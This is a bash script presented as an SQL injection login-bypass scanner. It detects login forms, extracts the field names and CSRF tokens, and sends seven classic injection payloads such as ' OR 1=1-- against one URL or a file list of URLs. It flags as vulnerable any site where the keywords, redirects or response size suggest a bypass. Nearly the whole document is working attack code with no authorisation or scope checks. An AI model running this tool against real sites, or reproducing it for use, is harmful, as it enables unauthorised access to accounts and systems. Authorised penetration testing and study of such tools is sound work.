#!/bin/bash

# Configuration
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
TIMEOUT=10
COOKIE_FILE="/tmp/sqli_cookies_$$.txt"
CSRF_TOKEN_FILE="/tmp/csrf_token_$$.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

WARNING="⚠️"
CHECK="✓"




# Cleanup function
cleanup() {
    rm -f  "$CSRF_TOKEN_FILE" /tmp/original_*.txt /tmp/sqli_*.txt 2>/dev/null
}
trap cleanup EXIT

# Check if page is a login form
is_login_page() {
    local html="$1"
    
    # Regex patterns for detecting login pages
    local patterns=(
        '<form[^>]*login'                # form with login
        'type=["'\'']?password["'\'']?'  # password field
        'name=["'\'']?username["'\'']?'  # username field
        'name=["'\'']?password["'\'']?'  # password name
        'action=["'\'']?.*login["'\'']?' # login action
        '<h1[^>]*>Login'                 # Login heading
        'id=["'\'']?login-form["'\'']?'  # login-form id
        'class=["'\'']?.*login.*["'\'']?' # login class
    )
    
    local score=0
    for pattern in "${patterns[@]}"; do
        if echo "$html" | grep -iq "$pattern"; then
            ((score++))
        fi
    done
    
    # Also check for common login page indicators
    if echo "$html" | grep -iq "log.*in\|sign.*in\|authentication"; then
        ((score+=2))
    fi
    
    # Return true if score >= 4 (likely a login page)
    [ $score -ge 4 ]
}

# Extract login form details
extract_login_form() {
    local html="$1"
    
    # Extract form action URL
    local action_url=$(echo "$html" | grep -i '<form' | grep -o 'action=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | head -1)
    
    # Extract input fields
    local inputs=$(echo "$html" | grep -i '<input' | sed 's/.*<input//i')
    
    # Extract method (default to POST)
    local method=$(echo "$html" | grep -i '<form' | grep -o 'method=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | tr '[:lower:]' '[:upper:]')
    method="${method:-POST}"
    
    # Find CSRF token
    local csrf_token=""
    if echo "$html" | grep -qi 'csrf\|token'; then
        csrf_token=$(echo "$html" | grep -i 'name=["'\'']\?csrf["'\'']\?' -A1 | grep -o 'value=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2)
        if [ -z "$csrf_token" ]; then
            csrf_token=$(echo "$html" | grep -i 'value=["'\'']\?.*' | grep -i input | grep -o 'value=["'\'']\?[^"'\'' ]*' | tail -1 | cut -d'"' -f2 | cut -d"'" -f2)
        fi
    fi
    
    # Find username field name
    local username_field=$(echo "$inputs" | grep -i 'username\|email\|user' | grep -o 'name=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | head -1)
    username_field="${username_field:-username}"
    
    # Find password field name
    local password_field=$(echo "$inputs" | grep -i 'password\|pass' | grep -o 'name=["'\'']\?[^"'\'' ]*' | cut -d'"' -f2 | cut -d"'" -f2 | head -1)
    password_field="${password_field:-password}"
    
    echo "$action_url|$method|$csrf_token|$username_field|$password_field"
}

# Curl wrapper
curl_request() {
    local url="$1"
    local method="$2"
    local data="$3"
    local follow_redirect="${4:-0}"
    
    local curl_opts=(
        -s
        -L
        --max-time "$TIMEOUT"
        --user-agent "$USER_AGENT"
        --cookie "$COOKIE_FILE"
        --cookie-jar "$COOKIE_FILE"
        -w "\n%{http_code}\n%{url_effective}"
    )
    
    if [ "$follow_redirect" -eq 1 ]; then
        curl_opts+=(--location)
    fi
    
    case "$method" in
        POST)
            curl_opts+=(-X POST)
            if [ -n "$data" ]; then
                curl_opts+=(--data-raw "$data")
                curl_opts+=(-H "Content-Type: application/x-www-form-urlencoded")
            fi
            ;;
        GET)
            curl_opts+=(-X GET)
            ;;
    esac
    
    curl "${curl_opts[@]}" "$url" 2>/dev/null
}

# Test SQL injection on login form
test_login_sqli() {
    local base_url="$1"
    


    echo "SQL Injecting Login Page: $base_url"
    
    # Step 1: Fetch the login page
    #echo "[*] Fetching login page..."
    response=$(curl_request "$base_url" "GET" "" 0)
    http_code=$(echo "$response" | tail -2 | head -1)
    final_url=$(echo "$response" | tail -1)
    html=$(echo "$response" | head -n -2)
    
    # Check if it's a login page
    if ! is_login_page "$html"; then
        echo "[-] Not a login page"
        return 1
    fi
    
    #echo "[+] Login page detected"
    
    # Step 2: Extract form details
    form_details=$(extract_login_form "$html")
    action_url=$(echo "$form_details" | cut -d'|' -f1)
    method=$(echo "$form_details" | cut -d'|' -f2)
    csrf_token=$(echo "$form_details" | cut -d'|' -f3)
    username_field=$(echo "$form_details" | cut -d'|' -f4)
    password_field=$(echo "$form_details" | cut -d'|' -f5)
    
    # Handle relative URLs
    if [[ ! "$action_url" =~ ^https?:// ]] && [ -n "$action_url" ]; then
        if [[ "$action_url" =~ ^/ ]]; then
            # Relative to domain root
            domain=$(echo "$final_url" | sed -E 's|(https?://[^/]+).*|\1|')
            action_url="${domain}${action_url}"
        else
            # Relative to current path
            action_url="${final_url%/*}/${action_url}"
        fi
    elif [ -z "$action_url" ]; then
        action_url="$final_url"
    fi
    
    echo "    Login URL: $action_url"
   # echo "    Method: $method"
   # echo "    CSRF Token: ${csrf_token:-(none)}"
   # echo "    Username field: $username_field"
   # echo "    Password field: $password_field"
   # echo
    
    # Step 3: Test normal login (should fail)
   # echo "[*] Testing normal login (should fail)..."
    
    # Build normal data
    normal_data=""
    if [ -n "$csrf_token" ]; then
        normal_data="csrf=${csrf_token}&"
    fi
    normal_data+="${username_field}=testuser&${password_field}=wrongpassword"
    
    normal_response=$(curl_request "$action_url" "$method" "$normal_data" 1)
    normal_http_code=$(echo "$normal_response" | tail -2 | head -1)
    normal_final_url=$(echo "$normal_response" | tail -1)
    normal_html=$(echo "$normal_response" | head -n -2)
    
    echo "$normal_html" > /tmp/original_login.txt
    
    # Step 4: Test SQL injection login
    echo "[*] Testing SQL injection login..."
    
    # Common SQL injection payloads for login bypass
    payloads=(
        "admin' OR '1'='1'-- -"
        "administrator'--"
        "' OR 1=1--"
        "admin'/*"
        "' OR 'a'='a"
        "admin' OR '1'='1'#"
        "' OR '1'='1'-- -"
    )
    
    vulnerable=0
    for payload in "${payloads[@]}"; do
    # Encode payload for URL
        echo "    Trying payload: $payload"
        
        # Build SQLi data
        sqli_data=""
        if [ -n "$csrf_token" ]; then
            sqli_data="csrf=${csrf_token}&"
        fi
        
        # URL encode the payload
        encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g; s/+/%2B/g')
        sqli_data+="${username_field}=${encoded_payload}&${password_field}=anything"
        
        sqli_response=$(curl_request "$action_url" "$method" "$sqli_data" 1)
        sqli_http_code=$(echo "$sqli_response" | tail -2 | head -1)
        sqli_final_url=$(echo "$sqli_response" | tail -1)
        sqli_html=$(echo "$sqli_response" | head -n -2)
        
        echo "$sqli_html" > "/tmp/sqli_login_${payload//[^a-zA-Z0-9]/_}.txt"
        
        # Detection logic
        if [ "$sqli_http_code" -eq 200 ]; then
            # Check for success indicators
            if echo "$sqli_html" | grep -iq "welcome\|logout\|my account\|dashboard\|success\|logged in"; then
                echo -e "${YELLOW}    ⚠️ SUCCESS! Login bypass with: $payload${NC}"
                echo "    Final URL: $sqli_final_url"
                vulnerable=1
                break
            fi
            
            # Check if we're redirected away from login page
            if [ "$normal_final_url" = "$final_url" ] && [ "$sqli_final_url" != "$final_url" ]; then
                echo "    [+] Redirect detected with: $payload"
                echo "    From: $final_url"
                echo "    To: $sqli_final_url"
                vulnerable=1
                break
            fi
            
            # Compare responses
            normal_len=$(echo "$normal_html" | wc -c)
            sqli_len=$(echo "$sqli_html" | wc -c)
            
            if [ "$sqli_len" -gt $((normal_len * 2)) ]; then
                echo "    [+] Large response difference detected with: $payload"
                echo "    Normal: $normal_len bytes"
                echo "    SQLi: $sqli_len bytes"
                vulnerable=1
                break
            fi
        fi
        
        sleep 0.5
    done
    
    echo
    
    if [ $vulnerable -eq 1 ]; then
        echo -e "${RED}[VULNERABLE] ⚠️  VULNERABLE TO SQL INJECTION LOGIN BYPASS!${NC}"
        echo -e "    URL: ${YELLOW}$base_url${NC}"
        echo -e "    Successful payload: ${YELLOW}$payload${NC}"
        return 0
    else
        echo "[-] No SQL injection vulnerability detected"
        return 1
    fi
}

# Main function to scan URLs
scan_urls() {
    local input="$1"
    
    if [ -f "$input" ]; then
        # Read from file
        echo "=== Scanning URLs from file: $input ==="
        echo
        
        while IFS= read -r url || [ -n "$url" ]; do
            [[ -z "$url" ]] && continue
            [[ "$url" =~ ^# ]] && continue
            
            echo "--------------------------------------------------"
            test_login_sqli "$url"
            echo
            sleep 2
        done < "$input"
    else
        # Single URL
        test_login_sqli "$input"
    fi
}

# Usage
show_help() {
    echo "SQL Injection Login Bypass Scanner"
    echo "Usage: $0 [OPTIONS] <URL or FILE>"
    echo
    echo "Options:"
    echo "  -h, --help     Show this help message"
    echo
    echo "Examples:"
    echo "  $0 https://example.com/login"
    echo "  $0 urls.txt"
    echo
    echo "The scanner will:"
    echo "  1. Detect login forms"
    echo "  2. Extract form parameters"
    echo "  3. Test multiple SQL injection payloads"
    echo "  4. Report successful login bypasses"
}

# Main execution
main() {
    if [ $# -eq 0 ] || [[ "$1" =~ ^-h|--help ]]; then
        show_help
        exit 0
    fi
    
    scan_urls "$1"
}

# Run main if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
